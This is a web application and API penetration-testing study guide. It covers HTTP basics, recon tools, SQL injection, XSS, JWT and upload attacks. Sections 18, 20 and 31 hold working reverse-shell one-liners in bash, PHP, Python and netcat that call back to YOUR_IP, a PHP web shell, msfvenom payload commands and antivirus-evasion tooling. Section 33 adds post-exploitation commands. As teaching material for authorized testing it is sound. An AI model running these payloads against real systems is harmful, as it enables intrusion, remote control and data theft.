# 09. Web Application & API Penetration Testing

> **Author:** Zeeshan  
> **GitHub:** [https://github.com/mzeeshanzafar28](https://github.com/mzeeshanzafar28)  
> **LinkedIn:** [https://www.linkedin.com/in/mzeeshanzafar28](https://www.linkedin.com/in/mzeeshanzafar28)

---

## Table of Contents

1. [HTTP & HTTPS Fundamentals](#1-http--https-fundamentals)
2. [HTTP Methods](#2-http-methods)
3. [HTTP Headers](#3-http-headers)
4. [HTTP Status Codes](#4-http-status-codes)
5. [Cookies & Sessions](#5-cookies--sessions)
6. [Authentication vs Authorization](#6-authentication-vs-authorization)
7. [Web Application Testing Methodology](#7-web-application-testing-methodology)
8. [Technology Fingerprinting & Reconnaissance](#8-technology-fingerprinting--reconnaissance)
9. [Directory & Content Discovery](#9-directory--content-discovery)
10. [Burp Suite Workflow](#10-burp-suite-workflow)
11. [Vulnerability Scanners](#11-vulnerability-scanners)
12. [Authentication Testing](#12-authentication-testing)
13. [Session Manipulation & Cookie Tampering](#13-session-manipulation--cookie-tampering)
14. [Authorization Testing (IDOR/BOLA)](#14-authorization-testing-idorbola)
15. [SQL Injection (SQLi)](#15-sql-injection-sqli)
16. [Cross-Site Scripting (XSS)](#16-cross-site-scripting-xss)
17. [Cross-Site Request Forgery (CSRF)](#17-cross-site-request-forgery-csrf)
18. [Command Injection](#18-command-injection)
19. [File Inclusion (LFI/RFI)](#19-file-inclusion-lfirfi)
20. [File Upload Attacks](#20-file-upload-attacks)
21. [Server-Side Request Forgery (SSRF)](#21-server-side-request-forgery-ssrf)
22. [Server-Side Template Injection (SSTI)](#22-server-side-template-injection-ssti)
23. [XML External Entity (XXE)](#23-xml-external-entity-xxe)
24. [WordPress Exploitation](#24-wordpress-exploitation)
25. [API Penetration Testing](#25-api-penetration-testing)
26. [JWT Security Testing](#26-jwt-security-testing)
27. [OAuth 2.0 Concepts](#27-oauth-20-concepts)
28. [GraphQL Testing](#28-graphql-testing)
29. [WebSocket Testing](#29-websocket-testing)
30. [WAF Detection & Bypass](#30-waf-detection--bypass)
31. [Gaining a Foothold](#31-gaining-a-foothold)
32. [Tools & Techniques Mapping](#32-tools--techniques-mapping)
33. [Post-Exploitation on Web Server](#33-post-exploitation-on-web-server)
34. [Practice & Labs](#34-practice--labs)

---

## 1. HTTP & HTTPS Fundamentals

HTTP is the application protocol for web communication between clients (browsers, tools) and web servers.

| Service | Port |
|---------|------|
| HTTP | **80/TCP** |
| HTTPS | **443/TCP** |
| Alternate HTTP | **8080/TCP** |
| Alternate HTTPS | **8443/TCP** |
| HTTP Proxy | **3128/TCP** |
| Dev servers | **3000, 5000, 8000** |

Never assume web apps exist only on standard ports. Scan broadly:

```bash
nmap -sV -p 80,443,3000,5000,8000,8080,8443 TARGET
```

**HTTP Request Structure:**

```http
POST /login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

username=admin&password=test
```

**JSON API request:**

```http
POST /api/login HTTP/1.1
Host: api.example.com
Content-Type: application/json

{"username":"admin","password":"test"}
```

---

## 2. HTTP Methods

| Method | Purpose |
|--------|---------|
| **GET** | Retrieve a resource |
| **POST** | Create/submit data |
| **PUT** | Replace a resource |
| **PATCH** | Partially modify a resource |
| **DELETE** | Delete a resource |
| **HEAD** | Retrieve headers only (no body) |
| **OPTIONS** | Discover supported methods |
| **TRACE** | Diagnostic; dangerous if enabled |

Test supported methods:

```bash
curl -i -X OPTIONS https://TARGET/
```

Test method switching for bypass:

```bash
# If GET /admin returns 403, try:
curl -i -X POST https://TARGET/admin
curl -i -X PUT https://TARGET/admin
curl -i -X HEAD https://TARGET/admin
```

POST example:

```bash
curl -i -X POST \
  -d 'username=test&password=test' \
  https://TARGET/login
```

---

## 3. HTTP Headers

Inspect response headers:

```bash
curl -I https://TARGET/
curl -i https://TARGET/
```

Key security headers to check:

| Header | Purpose |
|--------|---------|
| `Strict-Transport-Security` | Enforce HTTPS |
| `Content-Security-Policy` | Mitigate XSS/data injection |
| `X-Content-Type-Options` | Prevent MIME sniffing |
| `Referrer-Policy` | Control referrer information |
| `Permissions-Policy` | Control browser features |
| `Set-Cookie` | Session/cookie configuration |
| `Server` | Web server banner |
| `X-Powered-By` | Framework/technology info |

Banner grabbing:

```bash
nmap -sV -p 80,443 TARGET
nmap -p 80,443 --script http-title,http-headers TARGET
```

---

## 4. HTTP Status Codes

| Code | Meaning |
|------|---------|
| **200** | OK |
| **201** | Created |
| **204** | No Content |
| **301** | Moved Permanently |
| **302** | Found (temporary redirect) |
| **307** | Temporary Redirect |
| **400** | Bad Request |
| **401** | Unauthorized |
| **403** | Forbidden |
| **404** | Not Found |
| **405** | Method Not Allowed |
| **409** | Conflict |
| **429** | Too Many Requests (rate limiting) |
| **500** | Internal Server Error |
| **502** | Bad Gateway |
| **503** | Service Unavailable |

**WARNING:** Never assume `403` = secure, `404` = doesn't exist, or `500` = no vulnerability. Apps sometimes return misleading codes.

---

## 5. Cookies & Sessions

Cookies commonly maintain session identifiers, authentication state, preferences, and tracking data. A session associates multiple requests with an authenticated user.

**Important Cookie Attributes:**

| Attribute | Meaning |
|-----------|---------|
| `Secure` | Transmit only over HTTPS |
| `HttpOnly` | Block JavaScript access via `document.cookie` |
| `SameSite` | Control cross-site sending (`Strict`, `Lax`, `None`) |
| `Domain` | Which hosts receive the cookie |
| `Path` | Which URL path receives the cookie |
| `Expires` / `Max-Age` | Lifetime |

Example:

```http
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax
```

**What to test:**
- Are session IDs predictable?
- Do session IDs survive logout?
- Do sessions remain valid after password change?
- Does auth create a new session ID?
- Are cookies missing `Secure` / `HttpOnly` on HTTPS?
- Is `SameSite` incorrectly set?
- Is session timeout excessive?

---

## 6. Authentication vs Authorization

| Concept | Question |
|---------|----------|
| **Authentication** | *Who are you?* |
| **Authorization** | *What are you allowed to do?* |

A valid login (authentication) does **NOT** mean a user should access admin functions (authorization). These MUST be checked separately server-side.

---

## 7. Web Application Testing Methodology

```
1.  Scope definition
2.  Reconnaissance
3.  Technology identification
4.  Spidering / crawling
5.  Content discovery
6.  Authentication mapping
7.  Authorization mapping
8.  Input mapping (parameters, endpoints)
9.  Automated scanning
10. Manual testing (injection, logic flaws)
11. Exploitation
12. Impact validation
13. Evidence collection
14. Reporting
```

**Golden rule:** Do not start with SQLmap. First understand what the application does.

---

## 8. Technology Fingerprinting & Reconnaissance

### WhatWeb

```bash
whatweb https://TARGET
whatweb -v https://TARGET
whatweb -a 3 https://TARGET          # Aggressive mode
```

Looks for: web server, framework, CMS, JS libraries, cookies, headers, version indicators.

### Nmap HTTP Enumeration

```bash
nmap -sV -p 80,443,8080,8443 TARGET
nmap -p 80,443 --script http-title,http-headers TARGET
nmap -p 80,443 --script http-methods TARGET
nmap -p 80,443 --script "http-enum*" TARGET
```

Nmap scripts are at `/usr/share/nmap/scripts/`. List HTTP scripts:

```bash
ls /usr/share/nmap/scripts/ | grep '^http'
```

### Other Recon Sources

```bash
curl -s https://TARGET/robots.txt
curl -s https://TARGET/sitemap.xml
curl -s https://TARGET/.well-known/
```

### Browser Tools
- Wappalyzer (browser extension)
- Built-in Developer Tools (F12)
- Firebug / Inspect Element

---

## 9. Directory & Content Discovery

Industry-standard priority order:

### 1. ffuf (Fast & flexible)

```bash
# Basic directory fuzzing
ffuf -u https://TARGET/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,204,301,302,307,401,403

# With extensions
ffuf -u https://TARGET/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -e .php,.asp,.aspx,.jsp,.html,.txt,.bak,.old,.zip \
     -mc 200,301,302,403

# Filter by response size (baseline first!)
ffuf -u https://TARGET/FUZZ \
     -w wordlist.txt \
     -fs BASELINE_SIZE

# VHost discovery
ffuf -u http://TARGET/ \
     -H "Host: FUZZ.example.com" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs BASELINE_SIZE
```

### 2. Gobuster

```bash
gobuster dir \
  -u https://TARGET \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt

gobuster dir \
  -u https://TARGET \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,bak,html
```

### 3. Dirb / Dirbuster

```bash
dirb https://TARGET
dirb https://TARGET /usr/share/wordlists/dirb/common.txt
```

**Baseline the 404 response first:**

```bash
curl -i https://TARGET/random-nonexistent-path-12345
```

Then compare discovered responses against the baseline. A custom 404 can return `200`.

**Also check for:**
- `/.git/HEAD`
- `/.env`
- `/.svn/`
- `/.DS_Store`
- `backup.zip`, `dump.sql`
- `config.php.bak`, `config.php.old`
- Source maps: `/app.js.map`

---

## 10. Burp Suite Workflow

Burp Suite is the primary manual web testing tool. Core components:

| Tool | Purpose |
|------|---------|
| **Proxy** | Intercept browser traffic at `127.0.0.1:8080` |
| **Repeater** | Manually modify and resend individual requests |
| **Intruder** | Automate many request variations (fuzzing, brute-force) |
| **Decoder** | Encode/decode (Base64, URL, etc.) |
| **Comparer** | Diff two responses |
| **Sequencer** | Analyze session token randomness |
| **Logger** | Request/response history |

### Proxy Setup

```
Browser → 127.0.0.1:8080 → Burp → Target
```

Install Burp's CA certificate in the browser for HTTPS interception.

### Repeater Workflow

```
Capture request → Send to Repeater → Modify one variable → Send → Compare response
```

Test: parameters, headers, cookies, HTTP methods, content types, IDs, roles, tokens.

### Intruder: Cluster Bomb for Login Bruteforce

1. Capture the login POST request in Proxy.
2. Send to Intruder.
3. Clear all payload positions (`§`), then mark username and password fields.
4. **Attack type: Cluster Bomb** — tests every combination of username × password.
5. Set Payload 1 = username wordlist, Payload 2 = password wordlist.
6. Start attack. Sort by response length or status code to find valid credentials.

**Intruder Attack Types:**

| Type | Behavior |
|------|----------|
| **Sniper** | One payload position at a time |
| **Battering ram** | Same payload across all positions |
| **Pitchfork** | Multiple lists, matched position-by-position |
| **Cluster bomb** | All combinations across payload sets |

---

## 11. Vulnerability Scanners

Use as a coverage net alongside manual testing — NOT as a replacement. Scanners miss business logic flaws.

| Tool | Type | Notes |
|------|------|-------|
| **Nessus** | Commercial | Infrastructure + web checks |
| **OpenVAS (GVM)** | Free/Open-source | General-purpose vulnerability scanner |
| **OWASP ZAP** | Free/Open-source | Intercepting proxy + active/passive scanning |
| **Acunetix** | Commercial | Web-specialized |
| **Vega** | Free | Lightweight web scanner; useful second opinion |
| **Nikto** | Free | Web server scanner |

### ZAP Quick Start

```bash
zaproxy
```

Use passive scanning first, active scanning only when authorized and safe.

### Vega

GUI-based web vulnerability scanner. Use as a secondary scanner. Every finding must be validated manually.

---

## 12. Authentication Testing

**Test cases:**

- Default credentials (`admin:admin`, `root:root`, vendor defaults)
- Weak password policy
- Username enumeration (different error messages for "user not found" vs "wrong password")
- Rate limiting (check for `429` responses)
- Account lockout behavior
- Password reset flow (predictable tokens? reusable tokens?)
- MFA bypass
- Remember-me functionality
- Login error differences
- Session rotation after login
- Session invalidation after logout

**Username enumeration example:**

```text
"User does not exist"  vs  "Incorrect password"
```

Different messages or response lengths reveal valid usernames.

### Credential Brute-Force with Burp Intruder

```text
1. Capture POST /login request
2. Send to Intruder → Cluster Bomb attack
3. Payload set 1: usernames
4. Payload set 2: passwords
5. Sort by status/length to identify valid login
```

---

## 13. Session Manipulation & Cookie Tampering

The classic attack: manipulate client-side values to escalate privileges.

**Method:**
1. Login as a normal user.
2. Intercept a request to an admin page.
3. Modify: `Cookie: role=user` → `Cookie: role=admin`
4. Forward the request.

**Also test:**
- `Cookie: admin=false` → `true`
- `Cookie: user_id=1001` → `1002`
- JWT `role` claim manipulation (see JWT section)

**If authorization changes based only on a client-controlled value, the application is broken.**

Check whether:
- Session IDs are predictable (low entropy)
- Session fixation: does the app rotate the session ID after login?
- Cookie flags: missing `Secure`, `HttpOnly`, or `SameSite`?

---

## 14. Authorization Testing (IDOR/BOLA)

Authorization testing is one of the highest-value manual tests. Create two test users and compare their access.

**Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA):**

```
User A:  GET /api/users/1001  →  Returns user A's data
User B:  GET /api/users/1001  →  Should be DENIED
```

If User B can access User A's object, BOLA exists.

**Test object references in:**
- URLs (`?id=1002`)
- POST bodies (`{"user_id": 1002}`)
- JSON/GraphQL
- Headers, cookies
- File names, API paths

**Horizontal vs Vertical:**

| Type | Example |
|------|---------|
| **Horizontal** | User A → User B's data (same privilege level) |
| **Vertical** | Normal User → Admin endpoint (privilege escalation) |

Also check parameter tampering:

```text
role=user → role=admin
isAdmin=false → isAdmin=true
price=100 → price=1
discount=0 → discount=100
```

---

## 15. SQL Injection (SQLi)

SQLi occurs when attacker-controlled input changes the structure of a SQL query.

**Vulnerable pattern (conceptual):**

```python
query = "SELECT * FROM users WHERE name = '" + user_input + "'"
```

### Manual Detection

Start with harmless probes:

```text
'
"
)
```

Observe for: database errors, response differences, timing changes, boolean behavior.

**Boolean test:**

```text
' AND '1'='1      ← True, should return normal
' AND '1'='2      ← False, should return different
```

**UNION test:**

```text
' UNION SELECT NULL,NULL,NULL --
```

### SQLmap (Automated)

```bash
# Basic test
sqlmap -u 'https://TARGET/item?id=1' --batch

# Enumerate databases
sqlmap -u 'https://TARGET/item?id=1' --dbs

# Dump specific database
sqlmap -u 'https://TARGET/item?id=1' -D DATABASE_NAME --tables
sqlmap -u 'https://TARGET/item?id=1' -D DATABASE_NAME -T users --dump

# From Burp-captured request (handles cookies/headers/POST automatically)
sqlmap -r request.txt --batch

# POST request
sqlmap -u 'https://TARGET/login' --data='username=admin&password=test' -p username --batch

# With cookie
sqlmap -u 'https://TARGET/item?id=1' --cookie='PHPSESSID=abc123' --batch

# OS shell (if DB permissions allow)
sqlmap -u 'https://TARGET/item?id=1' --os-shell
```

### SQLi Injection Types

| Type | Description |
|------|-------------|
| **Error-based** | DB errors reveal info in response |
| **UNION-based** | `UNION SELECT` returns attacker data directly |
| **Boolean-based blind** | True/false page differences infer data bit-by-bit |
| **Time-based blind** | Deliberate delays (`SLEEP(5)`) infer data |
| **Out-of-band** | Data exfiltrated via separate channel (DNS, HTTP) |

### SQLi Workflow

```
Identify input → Test behavior → Determine context → Confirm vuln → 
Determine DB type → Assess impact → Stop when evidence sufficient
```

---

## 16. Cross-Site Scripting (XSS)

XSS occurs when attacker-controlled content is interpreted as executable JavaScript in a victim's browser.

| Type | Description |
|------|-------------|
| **Reflected** | Payload in request → reflected immediately in response |
| **Stored** | Payload stored server-side → served to other users later |
| **DOM-based** | Client-side JS reads attacker-controlled data → unsafe sink |

### Basic Test Payload

```html
<script>alert(document.domain)</script>
```

### XSS Contexts

A payload must match its output context:

| Context | Example |
|---------|---------|
| HTML body | `<div>USER_INPUT</div>` |
| HTML attribute | `<input value="USER_INPUT">` |
| JavaScript string | `var x = "USER_INPUT";` |
| URL | `<a href="USER_INPUT">` |

### Stored XSS Common Locations

Comments, profiles, support tickets, messages, forum posts, admin panels, product names.

### DOM XSS Sources and Sinks

**Sources:** `location.search`, `location.hash`, `document.URL`, `document.referrer`, `postMessage`

**Sinks:** `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`

---

## 17. Cross-Site Request Forgery (CSRF)

CSRF abuses a victim's authenticated browser to perform an unwanted state-changing action.

**Check for:**
- CSRF tokens in forms
- `SameSite` cookie attribute
- `Origin` / `Referer` header validation
- State-changing GET requests (e.g., `GET /delete-user?id=1`)

**Dangerous pattern:**

```http
POST /change-email HTTP/1.1
Cookie: session=abc123

email=attacker@example.com
```

If this can be triggered cross-site without a valid anti-CSRF token, a CSRF vulnerability exists.

---

## 18. Command Injection

Occurs when user input reaches an OS command interpreter.

**Test with:**

```bash
; id
| id
`id`
$(id)
&& id
|| id
```

**Blind command injection detection:**
- Time delays (`sleep 5`)
- Out-of-band callbacks (DNS/HTTP)

**Example vulnerable pattern:**

```text
ping 10.0.0.1; id
```

Once confirmed, pivot to a reverse shell:

```bash
; bash -i >& /dev/tcp/YOUR_IP/443 0>&1
```

---

## 19. File Inclusion (LFI/RFI)

**Local File Inclusion (LFI):** Include local files via user-controlled input.

Common parameters: `page=`, `file=`, `lang=`, `include=`, `path=`, `doc=`, `template=`

**Path traversal:**

```text
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

**PHP wrappers:**

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../../wp-config.php
```

**LFI → RCE via Log Poisoning:**
1. Poison Apache access log with PHP code in User-Agent header.
2. Include the log file: `/var/log/apache2/access.log`

**Remote File Inclusion (RFI):** Include attacker-hosted remote file. Requires `allow_url_include=On` (rare on modern PHP).

---

## 20. File Upload Attacks

### Bypass Techniques

| Technique | Example |
|-----------|---------|
| Double extension | `shell.php.jpg` |
| Case variation | `shell.PhP`, `shell.pHp5` |
| Null byte (old) | `shell.php%00.jpg` |
| MIME type manipulation | Change `Content-Type` to `image/jpeg` |
| Magic bytes | Add `GIF89a;` before PHP code |
| .htaccess upload | Upload `.htaccess` to execute `.jpg` as PHP |

### Web Shells

**Simple PHP one-liner:**

```php
<?php system($_GET['cmd']); ?>
```

Access: `https://TARGET/uploads/shell.php?cmd=id`

### Weevely (Obfuscated PHP Shell)

```bash
# Generate
weevely generate PASSWORD shell.php

# Connect
weevely https://TARGET/uploads/shell.php PASSWORD
```

### Veil (Payload Evasion)

Generate AV-evading payloads before uploading:

```bash
veil
# Use Veil-Evasion to generate payloads that bypass AV detection
```

### After Upload

1. Find the upload location (check response, guess common paths).
2. Browse to the file.
3. Prefer reverse shells over web shells when possible.

---

## 21. Server-Side Request Forgery (SSRF)

SSRF occurs when the server makes requests to attacker-influenced destinations.

**Common SSRF-enabled features:**
- URL preview/scraper
- Webhook tester
- Image importer (fetch from URL)
- PDF generator
- Remote file fetcher

**Test payload:**

```http
POST /fetch HTTP/1.1
Content-Type: application/json

{"url":"http://127.0.0.1:8080/"}
```

**Targets:**
- `127.0.0.1`, `localhost`
- Internal hostnames
- RFC1918 ranges (`10.x`, `172.16-31.x`, `192.168.x`)
- Cloud metadata: `169.254.169.254`

---

## 22. Server-Side Template Injection (SSTI)

User input is evaluated as a template expression instead of data.

**Common engines:** Jinja2, Twig, Freemarker, Velocity

**Detection probe:**

```text
{{7*7}}
${7*7}
<%= 7*7 %>
```

If the response shows `49`, SSTI exists. Identify the engine, then escalate to code execution.

---

## 23. XML External Entity (XXE)

Unsafe XML parsers resolve external entities, enabling file reads or SSRF.

**Test payload:**

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<test>&xxe;</test>
```

---

## 24. WordPress Exploitation

### Reconnaissance

```bash
whatweb https://TARGET
wpscan --url https://TARGET
```

### Enumeration

```bash
# Enumerate vulnerable plugins, themes, users
wpscan --url https://TARGET --enumerate u,vp,vt

# Aggressive plugin/theme detection
wpscan --url https://TARGET --enumerate ap,at,cb,dbe

# Enumerate users
wpscan --url https://TARGET --enumerate u

# Brute-force login
wpscan --url https://TARGET -U admin -P /usr/share/wordlists/rockyou.txt
```

### Common Attack Vectors

1. **Vulnerable Plugins:** Search Exploit-DB / searchsploit for identified plugin versions.
2. **Directory Traversal:** Test plugin-served file parameters for `../` traversal.
3. **Theme Editor RCE:** Once admin, go to Appearance → Theme Editor → inject PHP web shell.
4. **XML-RPC:** Check `xmlrpc.php` for pingback/brute-force abuse.
5. **wp-config.php:** Contains DB credentials if accessed via LFI.
6. **Backup files:** `wp-config.php.bak`, `database.sql`

### Plugin Exploit Workflow

```bash
# Identify plugin version via wpscan
wpscan --url https://TARGET --enumerate vp

# Search for exploits
searchsploit PLUGIN_NAME
searchsploit PLUGIN_NAME_VERSION

# Verify: Is the plugin installed? What version? Is the vulnerable component reachable?
```

---

## 25. API Penetration Testing

APIs frequently expose a larger attack surface than the visible web app.

### API Discovery

```bash
# Common paths
curl -i https://TARGET/api/
curl -i https://TARGET/api/v1/
curl -i https://TARGET/graphql
curl -i https://TARGET/swagger.json
curl -i https://TARGET/openapi.json
curl -i https://TARGET/api-docs
curl -i https://TARGET/docs
```

### REST API Testing

For every endpoint, determine:

```text
Who can read it?   Create it?   Modify it?   Delete it?
Can IDs be changed?   Can fields be added?
Is authorization consistent across versions?
```

**Test HTTP methods:**

```http
GET    /api/users/1001
POST   /api/users
PUT    /api/users/1001
PATCH  /api/users/1001
DELETE /api/users/1001
```

**Test content types:**

```http
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded
```

### Mass Assignment

If the backend auto-binds JSON fields to objects:

```json
{"name": "Zeeshan", "role": "admin"}
```

Test whether unauthorized fields (`role`, `isAdmin`, `verified`, `ownerId`) are accepted and applied.

### API Authentication Testing

**Common mechanisms:** Session cookies, API keys, Basic auth, Bearer tokens, JWT, OAuth 2.0

**Test:**
- Missing token → 401?
- Expired/invalid token handling
- Token reuse after logout
- Token scope/privilege
- User-to-user token substitution

---

## 26. JWT Security Testing

JWT structure: `header.payload.signature` (Base64URL-encoded, separated by dots)

```bash
# Decode JWT parts
echo 'BASE64URL_HEADER' | base64 -d
echo 'BASE64URL_PAYLOAD' | base64 -d
```

**Inspect claims:**

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "user123",
  "role": "user",
  "exp": 1234567890,
  "iat": 1234567890
}
```

**Key attacks to test:**

1. **Algorithm None:** Change `"alg": "HS256"` to `"alg": "none"`, remove signature, see if server accepts.
2. **Weak HMAC secret:** If `HS256`, try cracking the secret (`hashcat -m 16500 jwt.txt rockyou.txt`).
3. **Claim manipulation:** Change `"role": "user"` → `"role": "admin"` — only works if signature isn't verified.
4. **kid injection:** If header contains `"kid"`, test path traversal or SQLi via kid value.
5. **Expiration bypass:** Modify `exp` claim.

> **Important:** Decoding a JWT is NOT breaking it. The payload is Base64URL, not encrypted.

---

## 27. OAuth 2.0 Concepts

OAuth 2.0 is an authorization framework, NOT authentication by itself.

### Key Roles

| Role | Description |
|------|-------------|
| **Resource Owner** | The user |
| **Client** | The application requesting access |
| **Authorization Server** | Issues tokens (e.g., Google, Facebook) |
| **Resource Server** | Hosts protected data (the API) |

### Common Flows

- **Authorization Code** (most secure, server-side web apps)
- **Implicit** (deprecated, single-page apps legacy)
- **Client Credentials** (machine-to-machine)
- **Resource Owner Password** (legacy, avoid)

### Security Testing

- CSRF in authorization request (`state` parameter)
- Redirect URI validation (open redirect leading to token theft)
- Scope escalation
- Refresh token reuse after logout
- Client secret exposure in mobile/native apps

---

## 28. GraphQL Testing

GraphQL concentrates operations behind a single endpoint, typically `/graphql`.

### Introspection Test

```bash
curl -s https://TARGET/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"{__schema{queryType{name}}}"}'
```

If introspection is enabled, map: queries, mutations, types, arguments, IDs, relationships.

### Authorization

GraphQL authorization must be at the **resolver/object level**, not just hiding fields from UI. Test BOLA by requesting other users' objects through queries.

---

## 29. WebSocket Testing

WebSockets provide persistent bidirectional communication. Starts with HTTP upgrade.

```text
wss://TARGET/socket
```

**Test:** Authentication, authorization, origin validation, message manipulation, object-level auth, replay, rate limiting, injection.

---

## 30. WAF Detection & Bypass

### WAF Detection

```bash
# wafw00f
wafw00f https://TARGET

# nmap
nmap -p 80,443 --script http-waf-detect TARGET
```

### Common Bypass Techniques

| Technique | Example |
|-----------|---------|
| Case variation | `SeLeCt` |
| URL encoding | `%53%45%4C%45%43%54` |
| Double URL encoding | `%2553%2545` |
| Unicode | `/*!50000SELECT*/` |
| Comments inline | `SEL/**/ECT` |
| Null bytes | `%00` |
| HTTP parameter pollution | `?id=1&id=2` |
| Alternate methods | POST instead of GET |
| Chunked encoding | Split payload across chunks |
| Mixed case keywords | `sElEcT` |

### Firewall Evasion with nmap

```bash
# Fragment packets (MTU)
nmap --mtu 8 TARGET

# Decoy scan
nmap -sS -D RND:10 TARGET

# Spoof MAC
nmap --spoof-mac 0 TARGET

# Source port manipulation
nmap --source-port 53 TARGET
```

---

## 31. Gaining a Foothold

Preferred outcomes (in order):
1. **Reverse shell** (most useful for pivoting)
2. **Web shell** (Weevely, simple PHP)
3. **Valid credentials** (from DB dumps, config files)
4. **SSRF** reaching internal services

### Reverse Shell Payloads

```bash
# Bash
bash -i >& /dev/tcp/YOUR_IP/443 0>&1

# PHP
php -r '$sock=fsockopen("YOUR_IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat
nc -e /bin/sh YOUR_IP 443
```

### msfvenom Payloads

```bash
# PHP reverse shell
msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=443 -f raw > shell.php

# Linux reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f elf > shell.elf

# Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f exe > shell.exe
```

---

## 32. Tools & Techniques Mapping

| Technique | Primary Tool | Command |
|-----------|-------------|---------|
| **Technology ID** | WhatWeb | `whatweb https://TARGET` |
| **Directory Brute-force** | ffuf | `ffuf -u https://TARGET/FUZZ -w list.txt` |
| **Directory Brute-force** | Gobuster | `gobuster dir -u https://TARGET -w list.txt` |
| **Login Brute-force** | Burp Intruder | Cluster Bomb attack type |
| **Session Manipulation** | Burp Repeater | Modify cookie values |
| **WordPress Scanning** | WPScan | `wpscan --url https://TARGET -e` |
| **SQL Injection** | SQLmap | `sqlmap -u 'URL' --batch --dbs` |
| **Web Shell** | Weevely | `weevely generate PASS shell.php` |
| **Payload Evasion** | Veil | Generate AV-evading payloads |
| **Vulnerability Scanning** | Nessus / OpenVAS / ZAP | Automated coverage |
| **WAF Detection** | wafw00f | `wafw00f https://TARGET` |
| **Reverse Shell** | msfvenom | `msfvenom -p php/reverse_php LHOST=IP LPORT=443` |

---

## 33. Post-Exploitation on Web Server

The moment you get a shell:

```bash
id
ip a                    # Look for dual-homed interfaces — pivot opportunities!
uname -a
cat /etc/passwd
sudo -l
env
# Transfer LinPEAS / WinPEAS and escalate
```

Web servers are classic dual-homed pivots into internal networks. Treat every web foothold as a potential pivot point.

---

## 34. Practice & Labs

- **PortSwigger Web Security Academy** (free): Best structured training for every vulnerability class. Created by Burp Suite developers.
- **TryHackMe:** "Web Fundamentals", "OWASP Top 10", "SQL Injection", "File Inclusion", "Upload Vulnerabilities", "Burp Suite", "OWASP Juice Shop", "Pickle Rick"
- **DVWA / bWAPP / Mutillidae:** Free vulnerable web apps for local practice.
- **HackTheBox:** Web-focused Starting Point and Easy-tier machines.

### Goal

Reliably turn a basic web vulnerability into a stable shell and identify whether the host can be used as a pivot, all within 20–30 minutes.
